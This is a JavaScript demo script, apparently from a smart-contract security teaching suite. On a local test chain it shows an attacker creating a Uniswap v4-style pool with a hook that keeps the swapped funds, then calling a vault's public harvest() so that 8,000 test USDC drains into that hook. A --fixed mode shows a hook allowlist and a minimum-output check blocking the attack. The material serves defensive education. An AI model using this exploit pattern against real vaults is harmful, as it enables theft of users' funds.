// Attack #5: routing into the attacker's pool. Our vault sells its tUSDC rewards for tETH, anyone
// can trigger the harvest, and the caller picks the pool. In v4 anyone can create a pool with any
// hook, so the attacker creates one whose hook keeps everything.
//   node demos/05-route.mjs           any pool: 8,000 tUSDC in, 0 tETH out
//   node demos/05-route.mjs --fixed   hook allowlist + minimum out: HookNotAllowed
import { startChain, stopChains, roles, abis, units, fmt, short } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "route-fixed" : "route", fixed ? "Routing into the attacker's pool, fixed" : "Routing into the attacker's pool");
const C = await startChain();
const A = roles.attacker;

const usdc = await C.deploy("token", ["Test USDC", "tUSDC", 6]);
const eth = await C.deploy("token", ["Test ETH", "tETH", 18]);
const manager = await C.deploy("manager");
// --fixed only picks which vault contract is deployed.
const vault = await C.deploy(fixed ? "vaultFixed" : "vault", [manager, usdc, eth]);
const vabi = fixed ? abis.vaultFixed : abis.vault;

// The legitimate pool: our own no-op hook, real liquidity.
const good = await C.deploy("noop", [manager]);
const goodKey = { currency0: usdc, currency1: eth, fee: 3000, hooks: good };
await C.send(roles.deployer, manager, abis.manager, "initialize", [goodKey]);
await C.fund(usdc, roles.deployer, units(4_000_000, 6), manager);
await C.fund(eth, roles.deployer, units(1_000), manager);
await C.send(roles.deployer, manager, abis.manager, "addLiquidity", [goodKey, units(4_000_000, 6), units(1_000)]);
await C.send(roles.deployer, vault, vabi, "allowHook", [good]);
if (fixed) await C.send(roles.deployer, vault, vabi, "setExpected", [units(2)]);
await C.fund(usdc, vault, units(8_000, 6));
t.say(`vault rewards: ${fmt(await C.balanceOf(usdc, vault), 6)} tUSDC · harvest() is public, caller picks the pool`);

// The attacker deploys a hook and creates a pool with it. No permission needed.
const bad = await C.deploy("attackerHook", [manager]);
const badKey = { currency0: usdc, currency1: eth, fee: 3000, hooks: bad };
t.cmd(`attacker → poolManager.initialize(tUSDC/tETH, hook = ${short(bad)})   # their own hook`);
await C.send(A, manager, abis.manager, "initialize", [badKey]);
t.cmd(`attacker → vault.harvest(their pool)`);
const before = await C.balanceOf(usdc, vault);
const r = await C.attempt(A, vault, [...vabi, ...abis.manager], "harvest", [badKey]);
if (r.ok) t.bad(`  ✓ harvested`); else t.ok(`  ✗ reverted: ${r.name}`);
const spent = before - await C.balanceOf(usdc, vault);
const out = await C.balanceOf(eth, vault);
const kept = await C.balanceOf(usdc, bad);
(spent > 0n ? t.bad : t.ok)(`  in: ${fmt(spent, 6)} tUSDC · out: ${fmt(out, 18)} tETH · attacker hook holds ${fmt(kept, 6)} tUSDC`);
if (fixed) {
  t.cmd(`anyone → vault.harvest(the allowlisted pool)`);
  const g = await C.attempt(A, vault, vabi, "harvest", [goodKey]);
  t.ok(`  ${g.ok ? "✓" : "✗"} harvested · vault holds ${fmt(await C.balanceOf(eth, vault), 18, 2)} tETH`);
}
t.big(spent > 0n ? `${fmt(spent, 6)} tUSDC IN · ${fmt(out, 18)} OUT · THE HOOK KEPT IT` : `HOOK NOT ALLOWED · LOST 0 · REAL POOL PAID ${fmt(await C.balanceOf(eth, vault), 18, 2)} tETH`);
t.save(); stopChains(); process.exit(0);
